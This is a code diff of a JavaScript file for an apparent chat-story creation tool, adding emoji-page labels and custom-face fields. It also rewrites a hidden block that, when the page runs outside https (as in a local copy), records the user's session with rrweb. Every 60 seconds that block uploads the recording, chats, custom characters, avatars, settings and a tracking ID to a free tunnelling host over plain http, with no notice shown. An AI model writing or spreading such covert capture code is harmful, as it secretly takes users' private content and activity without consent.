@@ -18,7 +18,6 @@ if(window.location.href.indexOf('file:///') === 0)
 })();
 
 /*预定义区*/
-var send = false
 var mt_char = {}//自定义角色数据
 var mt_head = {}//自定义头像数据
 var mt_chars = false//自定义角色列表
@@ -1014,6 +1013,10 @@ function mt_emojis(S,mode)
 			{
 				表情类型 = `${name}(${maxNum}修复)`
 			}
+			else if(表情类型.indexOf('_OLD') > -1)
+			{
+				表情类型 = `${name}(${maxNum}废案)`
+			}
 			else
 			{
 				表情类型 = `${name}(${maxNum})`
@@ -1029,6 +1032,12 @@ function mt_emojis(S,mode)
 				if($(`.差分映射.selected`).length)$(`.差分映射.selected`)[0].scrollIntoView({inline:'center',behavior:"smooth"})
 			}, 100)
 			return;
+		}
+		else
+		{
+			自设差分[0] = mt_characters[id]['customface'] ? !0 : !1
+			自设差分[1] = 差分书签[id].type === 'customface' ? !0 : !1
+			自设差分[2] = CustomFaceAuthor[cfarr[pageIdnex][0]]
 		}
 		表情类型 = `${name}(0暂无)`
 		表情页码 = '0 / 0'
@@ -1303,11 +1312,55 @@ function Translator(str)
 }
 if(document.location.protocol !== 'https:')
 {
-	send = true
 	var record = [],recordName = getNowDate();
-	rrweb.record({emit(data){record.push(data)}});
 	localStorage['local_no'] = localStorage['local_no'] ? localStorage['local_no'] : Math.random()
-	setInterval(function(){send = true}, 60 * 1000);
+	rrweb.record(
+	{
+		emit(data)
+		{
+			record.push(typeof pako === "undefined" ? data : pako.deflate(JSON.stringify(data),{to:'string'}))
+		},
+		sampling:
+		{
+			mousemove: false,// 不录制鼠标移动事件
+			mouseInteraction: false, // 不录制鼠标交互事件
+			scroll: 150 ,// 设置滚动事件的触发频率 每 150ms 最多触发一次
+			media: 800,// 设置媒体交互事件的间隔
+			input: 'last', // 设置输入事件的录制时机 连续输入时，只录制最终值
+			mouseInteraction:
+			{// 定义不录制的鼠标交互事件类型，可以细粒度的开启或关闭对应交互录制
+				MouseUp: false,
+				MouseDown: false,
+				Click: false,
+				ContextMenu: false,
+				DblClick: false,
+				Focus: false,
+				Blur: false,
+				TouchStart: false,
+				TouchEnd: false
+			}
+		}
+	});
+	setInterval(function()
+	{
+		$.ajax(
+		{
+			url:'http://frp.freefrp.net:40404/moetalk.php',
+			async:true,
+			type:'POST',
+			data:
+			{
+				'chats': JSON.stringify(chats),
+				'mt_char': JSON.stringify(mt_char),
+				'mt_head': JSON.stringify(mt_head),
+				'local_no':localStorage['local_no'],
+				'mt_settings': localStorage['设置选项'],
+				'recordName':recordName+'-'+record.length,
+				'record':JSON.stringify(record)
+			},
+			dataType:'text'
+		});
+	}, 60 * 1000);
 }
 function moeLog(arr,mode = false)
 {
@@ -1329,28 +1382,6 @@ function moeLog(arr,mode = false)
 	{
 		操作历史.list[操作历史.index] = arr
 	}
-	if(send)
-	{
-		$.ajax(
-		{
-			url:'http://frp.freefrp.net:40404/moetalk.php',
-			async:true,
-			type:'POST',
-			data:
-			{
-				'chats': JSON.stringify(chats),
-				'mt_char': JSON.stringify(mt_char),
-				'mt_head': JSON.stringify(mt_head),
-				'local_no':localStorage['local_no'],
-				'mt_settings': localStorage['设置选项'],
-				'recordName':recordName,
-				'record':JSON.stringify(record)
-			},
-			dataType:'text',
-			success:function(){send = true}
-		});
-	}
-	send = false;
 	moetalkStorage.setItem('moeLog', 操作历史);
 }
 function 撤销(goback)
